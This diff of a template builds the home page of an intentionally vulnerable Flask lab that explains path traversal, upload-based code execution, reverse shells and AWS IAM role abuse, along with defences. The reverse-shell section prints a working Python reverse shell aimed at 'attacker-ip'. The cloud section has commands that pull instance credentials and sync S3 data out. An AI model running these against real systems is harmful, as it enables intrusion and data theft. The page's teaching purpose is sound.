@@ -1,5 +1,315 @@
- {% extends "/base/shell.html" %} {% block content %}
+{% extends "/base/shell.html" %} {% block content %}
 
-<h1>Welcome to the Vulnerable Flask Lab</h1>
-<p>Try accessing <code>/static../../app.py</code> to see the bug.</p>
+<div class="container mx-auto px-4 py-8 max-w-6xl">
+    <h1 class="text-4xl font-bold text-red-400 mb-4">⚠️ Vulnerable Web Application Demo</h1>
+
+    <div class="bg-red-900/30 border border-red-700 text-red-200 px-6 py-4 rounded-lg mb-6">
+        <strong class="font-bold">Warning:</strong> This is an intentionally vulnerable web application designed for educational purposes only. Do not deploy this in a production environment!
+    </div>
+
+    <!-- About This Demo Accordion -->
+    <div class="mb-4 border theme-border rounded-lg">
+        <button onclick="toggleAccordion('about')" class="w-full px-6 py-4 text-left theme-bg-secondary theme-bg-hover transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h2 class="text-2xl font-semibold theme-text-primary">About This Demo</h2>
+            <svg id="about-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="about-content" class="hidden px-6 py-4 theme-bg-secondary rounded-b-lg">
+            <p class="theme-text-secondary">This application demonstrates common web security vulnerabilities that can occur in real-world applications. It serves as a learning platform to understand how these vulnerabilities work and how they can be exploited.</p>
+        </div>
+    </div>
+
+    <h2 class="text-3xl font-bold theme-text-primary mb-4 mt-8">🔓 Identified Vulnerabilities</h2>
+
+    <!-- Vulnerability 1: Path Traversal -->
+    <div class="mb-4 border border-yellow-700 rounded-lg">
+        <button onclick="toggleAccordion('vuln1')" class="w-full px-6 py-4 text-left bg-yellow-900/30 hover:bg-yellow-900/50 transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h3 class="text-xl font-semibold theme-text-primary">1. Path Traversal Vulnerability</h3>
+            <svg id="vuln1-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="vuln1-content" class="hidden px-6 py-4 theme-bg-secondary rounded-b-lg">
+            <p class="mb-3 theme-text-secondary"><strong>Issue:</strong> Incorrect nginx configuration allows directory traversal attacks.</p>
+            <p class="mb-3 theme-text-secondary"><strong>Impact:</strong> Attackers can access any file on the server outside the intended web directory.</p>
+            <p class="mb-3 theme-text-secondary"><strong>Example:</strong> Try accessing <code class="theme-bg-hover px-2 py-1 rounded">/ static/../../app.py</code> to view the application source code.</p>
+            <p class="mb-3 theme-text-secondary"><strong>Root Cause:</strong> The nginx configuration doesn't properly restrict access to parent directories.</p>
+            <div class="bg-blue-900/30 border border-blue-700 text-blue-200 px-4 py-3 rounded">
+                <strong>Try it:</strong> Navigate to <a href="/static/../../app.py" class="text-blue-800 underline hover:text-blue-900">/static/../../app.py</a> to see the main application file!
+            </div>
+        </div>
+    </div>
+
+    <!-- Vulnerability 2: Remote Code Execution -->
+    <div class="mb-4 border border-red-700 rounded-lg">
+        <button onclick="toggleAccordion('vuln2')" class="w-full px-6 py-4 text-left bg-red-900/30 hover:bg-red-900/50 transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h3 class="text-xl font-semibold theme-text-primary">2. Remote Code Execution (RCE)</h3>
+            <svg id="vuln2-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="vuln2-content" class="hidden px-6 py-4 bg-gray-700 rounded-b-lg">
+            <p class="mb-3 text-gray-300"><strong>Issue:</strong> Poor architecture design allows normal users to overwrite Python files in the resumes directory.</p>
+            <p class="mb-3 text-gray-300"><strong>Impact:</strong> Attackers can upload malicious Python files that get executed on the server, leading to complete system compromise.</p>
+            <p class="mb-3 text-gray-300"><strong>Attack Vector:</strong> Upload a malicious .py file to the resumes directory, which can then be executed by the application.</p>
+            <p class="mb-3 text-gray-300"><strong>Root Cause:</strong> The application allows file uploads without proper validation and places executable Python files in an accessible directory.</p>
+            <div class="bg-yellow-900/30 border border-yellow-700 text-yellow-200 px-4 py-3 rounded">
+                <strong>Educational Note:</strong> In a real attack, this could allow an attacker to:
+                <ul class="list-disc ml-6 mt-2">
+                    <li>Execute arbitrary commands on the server</li>
+                    <li>Access sensitive files and databases</li>
+                    <li>Install backdoors for persistent access</li>
+                    <li>Pivot to other systems on the network</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Vulnerability 3: Reverse Shell -->
+    <div class="mb-4 border border-gray-800 rounded-lg">
+        <button onclick="toggleAccordion('vuln3')" class="w-full px-6 py-4 text-left bg-gray-800 text-white hover:bg-gray-700 transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h3 class="text-xl font-semibold">3. Reverse Shell & Remote Command Execution 🐚</h3>
+            <svg id="vuln3-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="vuln3-content" class="hidden px-6 py-4 bg-white rounded-b-lg">
+            <p class="mb-3"><strong>Issue:</strong> RCE vulnerability enables attackers to establish a reverse shell for interactive remote access.</p>
+            <p class="mb-3"><strong>Impact:</strong> An attacker can maintain persistent, interactive access to the server and execute commands in real-time.</p>
+            <p class="mb-3"><strong>Attack Scenario:</strong></p>
+            <ol class="list-decimal ml-6 mb-3">
+                <li>Exploit the file upload vulnerability to upload a malicious Python script</li>
+                <li>Script establishes a reverse shell connection back to attacker's machine</li>
+                <li>Attacker gains full terminal access to the compromised server</li>
+                <li>Can explore the system, exfiltrate data, and escalate privileges</li>
+            </ol>
+            <div class="bg-gray-900 text-white px-4 py-3 rounded mt-3">
+                <h5 class="font-bold mb-2">💻 Example Reverse Shell Command:</h5>
+                <pre class="text-sm overflow-x-auto"><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("attacker-ip",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Vulnerability 4: Cloud Security -->
+    <div class="mb-4 border border-purple-400 rounded-lg">
+        <button onclick="toggleAccordion('vuln4')" class="w-full px-6 py-4 text-left text-white hover:opacity-90 transition-opacity duration-200 flex justify-between items-center rounded-lg" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+            <h3 class="text-xl font-semibold">4. Cloud Security Exploitation (AWS EC2) ☁️</h3>
+            <svg id="vuln4-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="vuln4-content" class="hidden px-6 py-4 bg-white rounded-b-lg">
+            <p class="mb-3"><strong>Issue:</strong> This application runs on an AWS EC2 instance with overly permissive IAM instance role.</p>
+            <p class="mb-4"><strong>Impact:</strong> Once an attacker gains shell access, they can leverage the EC2 instance's IAM role to access AWS resources beyond the compromised server.</p>
+
+            <h5 class="text-lg font-semibold mb-3">🎯 Cloud Attack Chain:</h5>
+            <div class="bg-gray-100 p-4 rounded mb-3">
+                <p class="mb-2 font-semibold">Step 1: Gain Shell Access</p>
+                <p class="text-gray-600">Use RCE/Reverse Shell to obtain terminal access on the EC2 instance</p>
+            </div>
+            <div class="bg-gray-100 p-4 rounded mb-3">
+                <p class="mb-2 font-semibold">Step 2: Enumerate IAM Credentials</p>
+                <p class="text-gray-600 mb-2">Query the EC2 instance metadata service to retrieve temporary credentials:</p>
+                <pre class="bg-gray-900 text-white p-2 rounded text-sm overflow-x-auto"><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
+            </div>
+            <div class="bg-gray-100 p-4 rounded mb-3">
+                <p class="mb-2 font-semibold">Step 3: Exploit Overly Permissive Role</p>
+                <p class="text-gray-600 mb-2">If the instance role has excessive permissions, attackers could:</p>
+                <ul class="list-disc ml-6 text-gray-700">
+                    <li>Access S3 buckets containing sensitive data (customer info, backups, credentials)</li>
+                    <li>Read/write DynamoDB tables</li>
+                    <li>Launch additional EC2 instances for cryptomining</li>
+                    <li>Modify security groups to open backdoors</li>
+                    <li>Access Secrets Manager or Parameter Store secrets</li>
+                    <li>Exfiltrate data from RDS databases</li>
+                    <li>Modify Lambda functions or IAM policies</li>
+                    <li>Pivot to other AWS services and accounts</li>
+                </ul>
+            </div>
+
+            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mt-3">
+                <h5 class="font-bold mb-2">⚠️ Real-World Example:</h5>
+                <p class="mb-2">An instance role with <code class="bg-gray-100 px-2 py-1 rounded">s3:*</code> permissions could allow an attacker to:</p>
+                <pre class="bg-gray-900 text-white p-3 rounded text-sm overflow-x-auto mb-2"><code># List all S3 buckets in the account
+aws s3 ls
+
+# Download sensitive data
+aws s3 sync s3://company-secrets ./exfiltrated-data
+
+# Upload backdoors or ransomware
+aws s3 cp malware.sh s3://production-app/startup.sh</code></pre>
+                <p class="text-sm">This demonstrates the importance of applying the principle of least privilege to IAM roles.</p>
+            </div>
+
+            <div class="bg-yellow-100 border border-yellow-400 text-yellow-700 px-4 py-3 rounded mt-3">
+                <h5 class="font-bold mb-2">🔐 Common Misconfigurations:</h5>
+                <ul class="list-disc ml-6">
+                    <li><code class="bg-gray-100 px-2 py-1 rounded">AdministratorAccess</code> policy attached to instance role</li>
+                    <li>Wildcard permissions like <code class="bg-gray-100 px-2 py-1 rounded">s3:*</code> or <code class="bg-gray-100 px-2 py-1 rounded">ec2:*</code></li>
+                    <li>Resource set to <code class="bg-gray-100 px-2 py-1 rounded">*</code> instead of specific ARNs</li>
+                    <li>No conditions on sensitive actions</li>
+                    <li>Cross-account access without proper restrictions</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Best Practices Accordion -->
+    <div class="mb-4 mt-8 border border-green-400 rounded-lg">
+        <button onclick="toggleAccordion('practices')" class="w-full px-6 py-4 text-left bg-green-100 hover:bg-green-200 transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h2 class="text-2xl font-semibold text-gray-800">🛡️ Security Best Practices</h2>
+            <svg id="practices-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="practices-content" class="hidden px-6 py-4 bg-white rounded-b-lg">
+            <h5 class="font-semibold mb-3">To prevent these vulnerabilities:</h5>
+            <ul class="space-y-4">
+                <li>
+                    <strong>Path Traversal:</strong>
+                    <ul class="list-disc ml-6 mt-2 text-gray-700">
+                        <li>Properly configure web server (nginx/Apache) to restrict directory access</li>
+                        <li>Validate and sanitize all user inputs</li>
+                        <li>Use absolute paths and avoid relative path construction</li>
+                        <li>Implement proper access controls</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>File Upload Security:</strong>
+                    <ul class="list-disc ml-6 mt-2 text-gray-700">
+                        <li>Validate file types and extensions</li>
+                        <li>Store uploaded files outside the web root</li>
+                        <li>Never execute uploaded files directly</li>
+                        <li>Implement proper file permissions</li>
+                        <li>Scan uploaded files for malicious content</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>Reverse Shell Prevention:</strong>
+                    <ul class="list-disc ml-6 mt-2 text-gray-700">
+                        <li>Implement network egress filtering (block outbound connections to unknown IPs)</li>
+                        <li>Use application whitelisting to prevent unauthorized code execution</li>
+                        <li>Monitor for unusual network connections and processes</li>
+                        <li>Implement intrusion detection/prevention systems (IDS/IPS)</li>
+                        <li>Use security groups/firewalls to restrict outbound traffic</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>Cloud Security (AWS/EC2):</strong>
+                    <ul class="list-disc ml-6 mt-2 text-gray-700">
+                        <li><strong>Principle of Least Privilege:</strong> Only grant the minimum permissions needed</li>
+                        <li>Use specific resource ARNs instead of wildcards (<code class="bg-gray-100 px-2 py-1 rounded">*</code>)</li>
+                        <li>Implement IAM permission boundaries</li>
+                        <li>Regularly audit IAM roles and policies with AWS Access Analyzer</li>
+                        <li>Enable CloudTrail logging to monitor API calls</li>
+                        <li>Use AWS IMDSv2 (Instance Metadata Service v2) to prevent SSRF attacks on metadata</li>
+                        <li>Implement VPC endpoints for AWS services instead of internet routing</li>
+                        <li>Enable GuardDuty for threat detection</li>
+                        <li>Use AWS Organizations SCPs (Service Control Policies) for guardrails</li>
+                    </ul>
+                </li>
+            </ul>
+
+            <div class="bg-gray-100 p-4 rounded mt-4">
+                <h5 class="font-semibold mb-2">🔍 Example: Secure IAM Instance Role</h5>
+                <p class="mb-2">Instead of overly permissive policies, use specific permissions:</p>
+                <pre class="bg-gray-900 text-white p-3 rounded text-sm overflow-x-auto"><code>{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:GetObject"
+      ],
+      "Resource": [
+        "arn:aws:s3:::specific-bucket-name/specific-prefix/*"
+      ]
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents"
+      ],
+      "Resource": "arn:aws:logs:*:*:log-group:/aws/ec2/app-name/*"
+    }
+  ]
+}</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Learning Objectives Accordion -->
+    <div class="mb-4 border border-blue-400 rounded-lg">
+        <button onclick="toggleAccordion('objectives')" class="w-full px-6 py-4 text-left bg-blue-100 hover:bg-blue-200 transition-colors duration-200 flex justify-between items-center rounded-lg">
+            <h2 class="text-2xl font-semibold text-gray-800">🎯 Learning Objectives</h2>
+            <svg id="objectives-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="objectives-content" class="hidden px-6 py-4 bg-white rounded-b-lg">
+            <p class="mb-3">By exploring this vulnerable application, you should learn:</p>
+            <ul class="list-disc ml-6 text-gray-700 space-y-1">
+                <li>How path traversal attacks work and their impact</li>
+                <li>The dangers of improper file upload handling</li>
+                <li>How architectural flaws can lead to severe security issues</li>
+                <li>The importance of secure coding practices</li>
+                <li>How to identify and mitigate common web vulnerabilities</li>
+                <li class="text-red-600 font-semibold">How reverse shells enable persistent attacker access</li>
+                <li class="text-red-600 font-semibold">The cascading impact of cloud misconfigurations</li>
+                <li class="text-red-600 font-semibold">Why IAM least privilege is critical in cloud environments</li>
+                <li class="text-red-600 font-semibold">How a single compromised server can lead to full AWS account takeover</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Defense in Depth Accordion -->
+    <div class="mb-4 border-2 border-purple-500 rounded-lg">
+        <button onclick="toggleAccordion('defense')" class="w-full px-6 py-4 text-left text-white hover:opacity-90 transition-opacity duration-200 flex justify-between items-center rounded-lg" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">
+            <h2 class="text-2xl font-semibold">💡 Key Takeaway: Defense in Depth</h2>
+            <svg id="defense-icon" class="w-6 h-6 transform transition-transform duration-200" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+            </svg>
+        </button>
+        <div id="defense-content" class="hidden px-6 py-4 bg-white rounded-b-lg">
+            <p class="mb-2">This demo shows why <strong>defense in depth</strong> is crucial. A single vulnerability is bad, but when combined with:</p>
+            <ul class="list-disc ml-6 mb-3 text-gray-700">
+                <li>Weak network controls (allowing reverse shells)</li>
+                <li>Overly permissive cloud IAM roles</li>
+                <li>Lack of monitoring and detection</li>
+                <li>Missing segmentation between services</li>
+            </ul>
+            <p>...the impact multiplies exponentially. Each security layer that fails gives attackers more power and persistence.</p>
+        </div>
+    </div>
+
+    <div class="bg-blue-100 border border-blue-400 text-blue-700 px-6 py-4 rounded-lg mt-6">
+        <strong>Remember:</strong> This application is for educational purposes only. Always follow responsible disclosure practices when testing real applications, and never exploit vulnerabilities in systems you don't own or don't have explicit permission
+        to test.
+    </div>
+</div>
+
+<script>
+    function toggleAccordion(id) {
+        const content = document.getElementById(id + '-content');
+        const icon = document.getElementById(id + '-icon');
+
+        if (content.classList.contains('hidden')) {
+            content.classList.remove('hidden');
+            icon.classList.add('rotate-180');
+        } else {
+            content.classList.add('hidden');
+            icon.classList.remove('rotate-180');
+        }
+    }
+</script>
+
 {% endblock %}
